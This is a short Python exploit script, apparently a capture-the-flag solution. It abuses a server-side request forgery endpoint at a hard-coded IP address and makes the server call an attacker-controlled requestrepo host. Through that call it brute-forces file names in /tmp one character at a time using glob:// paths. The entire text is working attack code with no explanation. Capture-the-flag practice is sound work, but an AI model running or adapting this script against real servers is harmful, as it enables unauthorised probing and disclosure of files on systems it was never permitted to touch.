import requests
from string import ascii_lowercase, digits 

url = 'http://45.122.249.68:10004/ssrf.php?host=http://meo.58c8d7tk.requestrepo.com/dir.php'

dir = '/tmp'
charset = ascii_lowercase + digits + '._/'

found = False
while not found:
    found = True
    for c in charset:
        print(c)
        r = requests.get(url + f'?dir_name=glob://{dir + c}*')

        if 'dir' in r.text or 'file' in r.text:
            dir += c
            found = False
            print('found:', dir + c)
            break

print('found:', dir)